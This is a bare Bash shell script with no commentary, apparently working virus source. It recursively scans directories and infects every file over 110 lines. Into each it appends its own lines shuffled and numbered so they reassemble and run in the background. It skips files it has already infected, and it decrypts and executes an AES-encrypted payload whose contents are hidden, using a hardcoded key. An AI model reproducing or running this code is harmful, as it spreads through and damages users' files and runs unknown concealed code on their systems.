if [ "$1" == "test" ]; then  #@1
  exit 0  #@2
fi  #@3
tree=()  #@4   
visit(){  #@5
  directory=$1  #@6
  for target in $directory; do  #@7  
      if [ -d "$target" ];then  #@8
        visit "$target/*"  #@9
    else  #@10
      tree+=("$target")  #@11
      fi  #@12
  done  #@13
}  #@14
visit "*"  #@15
MANAGER=(test cd ls pwd)  #@16
RANDOM=$$  #@17
for (( i=0; i<${#tree[@]}; i++ )); do  #@18
  target=${tree[i]}  #@19
  nbline=$(wc -l $target)  #@20
  nbline=${nbline##}  #@21
  nbline=$(echo $nbline | cut -d " " -f1)  #@22
  if [ $(($nbline)) -lt 110 ]; then  #@23
    continue  #@24
  fi  #@25
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@26
  tail -n 78 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@27
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@28
  if [ "$?" == "0" ]; then  #@29
    continue  #@30
  fi  #@31
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@32
  NEWFILE="/tmp/.$NEWFILE"  #@33
  echo "tail -n 78 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@34
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@35
  echo "exit 0" >> $target  #@36
  tabft=("FT" [78]=" ")  #@37
  declare -i nbl=0  #@38
  while [ $nbl -ne 78 ]; do  #@39
    valindex=$(((RANDOM % 78)+1))  #@40
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@41
      valindex=$(((RANDOM % 78) + 1))  #@42
    done  #@43
    line=$(tail -n $valindex $0 | head -1)  #@44
    echo -e "$line" >> $target  #@45
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@46
  done  #@47
done  #@48
rm /tmp/.* 2> /dev/null #@49
filename="$0"  #@50
key="asdffdsa"  #@51
payload=()  #@52
while read -r line; do  #@53
    row="$line"  #@54
    if [ "$row" == "# Start payload" ]; then  #@55
      while read -r line; do  #@56
        row="$line"  #@57
        if [ "$row" == "# End payload" ]; then  #@58
# Start payload
# U2FsdGVkX1/sR6BSVb24vkVlwoEd4fw9q0AJOjmDxWq8twhYprob33H09R3uZmtY
# aqzZDIg5lHHDJwdintAteYEiVG3+uMmEnoaIUBRm7oLjPa52jxQj7JeNLne6+W5r
# End payload
          break  #@59
        fi  #@60
        row=$(echo "$row" | cut -d' ' -f 2)  #@61
        payload+=("$row")  #@62
      done  #@63
  fi  #@64
done < "$filename"  #@65
for (( i=0; i<${#payload[@]}; i++ )); do  #@66
  echo "${payload[i]}" >> xxxxxxxxxxencrypt.sh  #@67
done  #@68
echo "#!/bin/sh" >> xxxxxxxxxxdecrypt.sh  #@69
openssl enc -d -aes-128-cbc -a -salt -pass pass:$key -in xxxxxxxxxxencrypt.sh >> xxxxxxxxxxdecrypt.sh  #@70
chmod 777 xxxxxxxxxxdecrypt.sh  #@71
sh ./xxxxxxxxxxdecrypt.sh  #@72
rm xxxxxxxxxxencrypt.sh  #@73
rm xxxxxxxxxxdecrypt.sh  #@74
